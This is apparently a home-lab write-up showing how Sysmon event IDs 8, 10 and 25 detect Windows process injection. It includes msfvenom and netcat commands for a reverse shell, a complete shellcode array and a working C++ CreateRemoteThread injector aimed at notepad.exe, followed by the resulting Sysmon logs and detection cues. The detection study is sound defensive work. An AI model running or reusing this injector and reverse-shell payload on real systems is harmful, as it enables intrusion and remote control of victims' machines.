# Process injection techniques with SYSMON monitor
What Each Sysmon Event ID Catches:
- Event ID 8 CreateRemoteThread: Fires when a thread is created in another process. Catches: classic CRT, NtCreateThreadEx (sometimes), RtlCreateUserThread. Does NOT fire for APC injection since no thread is created — an existing thread is targeted.
- Event ID 10 ProcessAccess: Fires when a process opens a handle to another process with specific access rights (PROCESS_VM_WRITE, PROCESS_VM_READ, PROCESS_CREATE_THREAD). This is your broadest net — virtually every injection technique requires a handle to the target process.
- Event ID 25 ProcessTampering: Fires specifically on image replacement or process hollowing — when the mapped image in memory no longer matches the file on disk. Catches: hollowing, module stomping, some reflective DLL variants.
<img width="942" height="712" alt="image" src="https://github.com/user-attachments/assets/65977293-a5d1-43cc-8dab-a8c0f33aa17d" />

## Lab setup
1. Windows Host running ELK in WSL with local FW rules to push traffic to the host -> WSL
2. Windows VM with Elastic Agent, Sysmon and sysmonconfig-olaf-filedelete.xml on bridged network
3. Kali VM as attacking machine on bridged network


## Init common header with shellcode
On Kali run:
- msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.32.49 LPORT=4444 -f c -b \x00\x0a\x0d
- nc -lvnp 4444


Then common header used for each exploit
```
#pragma once
#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <stdint.h>


unsigned char shellcode[] = 
"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\xf8\xd1\x23\xeb\xbe\xe7\xfa\x58\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x04\x99\xa0"
"\x0f\x4e\x0f\x3a\x58\xf8\xd1\x62\xba\xff\xb7\xa8\x09\xae"
"\x99\x12\x39\xdb\xaf\x71\x0a\x98\x99\xa8\xb9\xa6\xaf\x71"
"\x0a\xd8\x99\xa8\x99\xee\xaf\xf5\xef\xb2\x9b\x6e\xda\x77"
"\xaf\xcb\x98\x54\xed\x42\x97\xbc\xcb\xda\x19\x39\x18\x2e"
"\xaa\xbf\x26\x18\xb5\xaa\x90\x72\xa3\x35\xb5\xda\xd3\xba"
"\xed\x6b\xea\x6e\x6c\x7a\xd0\xf8\xd1\x23\xa3\x3b\x27\x8e"
"\x3f\xb0\xd0\xf3\xbb\x35\xaf\xe2\x1c\x73\x91\x03\xa2\xbf"
"\x37\x19\x0e\xb0\x2e\xea\xaa\x35\xd3\x72\x10\xf9\x07\x6e"
"\xda\x77\xaf\xcb\x98\x54\x90\xe2\x22\xb3\xa6\xfb\x99\xc0"
"\x31\x56\x1a\xf2\xe4\xb6\x7c\xf0\x94\x1a\x3a\xcb\x3f\xa2"
"\x1c\x73\x91\x07\xa2\xbf\x37\x9c\x19\x73\xdd\x6b\xaf\x35"
"\xa7\xe6\x11\xf9\x01\x62\x60\xba\x6f\xb2\x59\x28\x90\x7b"
"\xaa\xe6\xb9\xa3\x02\xb9\x89\x62\xb2\xff\xbd\xb2\xdb\x14"
"\xf1\x62\xb9\x41\x07\xa2\x19\xa1\x8b\x6b\x60\xac\x0e\xad"
"\xa7\x07\x2e\x7e\xa2\x00\x90\x89\x6a\xa7\xe2\x11\xeb\xbe"
"\xa6\xac\x11\x71\x37\x6b\x6a\x52\x47\xfb\x58\xf8\x98\xaa"
"\x0e\xf7\x5b\xf8\x58\xe9\x8d\xe3\x43\x9e\xd6\xbb\x0c\xb1"
"\x58\xc7\xa7\x37\x16\xbb\xe2\xb4\xa6\x05\xec\x41\x32\xb6"
"\xd1\x12\xb9\x22\xea\xbe\xe7\xa3\x19\x42\xf8\xa3\x80\xbe"
"\x18\x2f\x08\xa8\x9c\x12\x22\xf3\xd6\x3a\x10\x07\x11\x6b"
"\x62\x7c\xaf\x05\x98\xb0\x58\xe2\xaa\x04\x0d\xf5\x87\x18"
"\x2e\xf6\xa3\x37\x20\x90\x48\xb9\x89\x6f\x62\x5c\xaf\x73"
"\xa1\xb9\x6b\xba\x4e\xca\x86\x05\x8d\xb0\x50\xe7\xab\xbc"
"\xe7\xfa\x11\x40\xb2\x4e\x8f\xbe\xe7\xfa\x58\xf8\x90\x73"
"\xaa\xee\xaf\x73\xba\xaf\x86\x74\xa6\x8f\x27\x90\x55\xa1"
"\x90\x73\x09\x42\x81\x3d\x1c\xdc\x85\x22\xea\xf6\x6a\xbe"
"\x7c\xe0\x17\x23\x83\xf6\x6e\x1c\x0e\xa8\x90\x73\xaa\xee"
"\xa6\xaa\x11\x07\x11\x62\xbb\xf7\x18\x32\x15\x71\x10\x6f"
"\x62\x7f\xa6\x40\x21\x34\xee\xa5\x14\x6b\xaf\xcb\x8a\xb0"
"\x2e\xe9\x60\xb0\xa6\x40\x50\x7f\xcc\x43\x14\x6b\x5c\x0a"
"\xed\x5a\x87\x62\x51\x18\x72\x47\xc5\x07\x04\x6b\x68\x7a"
"\xcf\xc6\x5e\x84\xdb\xa3\x10\x5e\x92\xff\xe3\xbf\xc2\x51"
"\x84\xd4\xe7\xa3\x19\x71\x0b\xdc\x3e\xbe\xe7\xfa\x58";

SIZE_T shellcode_size = sizeof(shellcode);

// Helper: find PID by process name
DWORD GetPID(const wchar_t* procName) {
    DWORD pid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, procName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}
```

## Technique 1. Classic CreateRemoteThread
The attack opens a handle to a running process, writes shellcode into its memory, then creates a new thread inside that process to execute it. All through documented Win32 API calls in kernel32.dll. It is the most well-known injection technique and should be detected by all EDR.
The four API calls and what Sysmon sees at each step:
- OpenProcess()    → EID 10 handle opened with PROCESS_ALL_ACCESS (0x1fffff)
- VirtualAllocEx()  → allocates RWX memory in target (no Sysmon event)
- WriteProcessMemory()  → writes shellcode bytes (no Sysmon event)
- CreateRemoteThread()  → EID 8 new thread created in remote process

```
// t1_classic_crt.cpp
#include "common.h"

int main() {
    DWORD pid = GetPID(L"notepad.exe");
    if (!pid) {
        wprintf(L"[-] notepad.exe not found\n");
        return 1;
    }
    wprintf(L"[*] Target PID: %lu\n", pid);

    // EID 10 fires here
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) {
        wprintf(L"[-] OpenProcess failed: %lu\n", GetLastError());
        return 1;
    }
    wprintf(L"[+] Handle acquired\n");

    LPVOID remoteMem = VirtualAllocEx(
        hProc, NULL, shellcode_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!remoteMem) {
        wprintf(L"[-] VirtualAllocEx failed\n");
        return 1;
    }
    wprintf(L"[+] Remote memory allocated: 0x%p\n", remoteMem);

    SIZE_T written = 0;
    if (!WriteProcessMemory(hProc, remoteMem, shellcode, shellcode_size, &written)) {
        wprintf(L"[-] WriteProcessMemory failed\n");
        return 1;
    }
    wprintf(L"[+] Shellcode written: %zu bytes\n", written);

    // EID 8 fires here
    HANDLE hThread = CreateRemoteThread(
        hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)remoteMem,
        NULL, 0, NULL
    );
    if (!hThread) {
        wprintf(L"[-] CreateRemoteThread failed: %lu\n", GetLastError());
        return 1;
    }
    wprintf(L"[+] Remote thread created\n");
    wprintf(L"[*] Watch Elastic for EID 8 and EID 10\n");

    WaitForSingleObject(hThread, 5000);
    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}
```

### SYSMON data
1. "CreateRemoteThread detected:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2026-05-12 10:59:21.168
SourceProcessGuid: {ED9BFE1B-0808-6A03-5206-000000000A00}
SourceProcessId: 13124
SourceImage: C:\Users\jens\Documents\procInj\t1_classic_crt.exe
TargetProcessGuid: {ED9BFE1B-0741-6A03-4F06-000000000A00}
TargetProcessId: 11168
TargetImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
NewThreadId: 2580
StartAddress: 0x000001B21DF60000
StartModule: -
StartFunction: -
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

2. "Process accessed:
RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
UtcTime: 2026-05-12 10:59:21.405
SourceProcessGUID: {ED9BFE1B-0741-6A03-4F06-000000000A00}
SourceProcessId: 11168
SourceThreadId: 2580
SourceImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
TargetProcessGUID: {ED9BFE1B-0809-6A03-5606-000000000A00}
TargetProcessId: 12688
TargetImage: C:\WINDOWS\system32\cmd.exe
GrantedAccess: 0x1fffff
CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+163514|C:\WINDOWS\System32\KERNELBASE.dll+b0c3a|C:\WINDOWS\System32\KERNELBASE.dll+ae153|C:\WINDOWS\System32\KERNELBASE.dll+adcb6|C:\WINDOWS\System32\KERNEL32.DLL+44fd4|UNKNOWN(000001B21DF601BC)
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

3. "Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2026-05-12 10:59:21.401
ProcessGuid: {ED9BFE1B-0809-6A03-5606-000000000A00}
ProcessId: 12688
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.8115 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd
CurrentDirectory: C:\Users\jens\
User: WIN11\jens
LogonGuid: {ED9BFE1B-E11B-6A02-743F-0B0000000000}
LogonId: 0xb3f74
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=2EDE04B00B744D0D2D5614E83997022CC3EF3656,MD5=77F0062F490BCC7023763A422E561945,SHA256=14CC8AB1DCF0D9F19E8FB82DEB547CF8C462C56A0E43F7ADDC02641AB3C81651,IMPHASH=B0F049C014592B156EB1FA857E99CEB9
ParentProcessGuid: {ED9BFE1B-0741-6A03-4F06-000000000A00}
ParentProcessId: 11168
ParentImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
ParentCommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe"" RestartByRestartManager:* 
ParentUser: WIN11\jens"

4. "Network connection detected:
RuleName: technique_id=T1571,technique_name=Non-Standard Port
UtcTime: 2026-05-12 10:59:20.654
ProcessGuid: {ED9BFE1B-0741-6A03-4F06-000000000A00}
ProcessId: 11168
Image: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
User: WIN11\jens
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 192.168.32.39
SourceHostname: -
SourcePort: 57327
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 192.168.32.49
DestinationHostname: -
DestinationPort: 4444
DestinationPortName: -"

### SYSMON analysis
t1_classic_crt.exe → OpenProcess(notepad)     [EID 10]
                   → CreateRemoteThread        [EID 8]
                   → notepad spawns cmd.exe    [EID 1]
                   → notepad connects to C2    [EID 3]
- EID 8 CreateRemoteThread: "StartModule: -" is a critical detection signal. Legitimate threads start from a named module. Anonymous memory is almost always shellcode.
- EID 10 ProcessAccess: The UNKNOWN in the call trace is another strong indicator, legitimate code always has a named module in the trace. Shellcode executing from anonymous memory shows up as UNKNOWN.
